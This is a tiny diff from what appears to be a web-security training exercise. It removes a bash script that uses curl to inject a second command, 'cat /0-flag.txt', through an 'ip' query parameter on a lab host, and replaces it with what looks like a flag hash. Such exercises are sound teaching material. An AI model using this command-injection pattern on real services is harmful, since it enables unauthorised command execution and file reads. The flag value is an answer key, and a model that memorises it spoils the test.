@@ -1,2 +1,1 @@
-#!/bin/bash
-curl -s "http://web0x09.hbtn-task0/?ip=$1;cat%20/0-flag.txt"
+2c9bf9454d20c718381a783e5fc4f58e
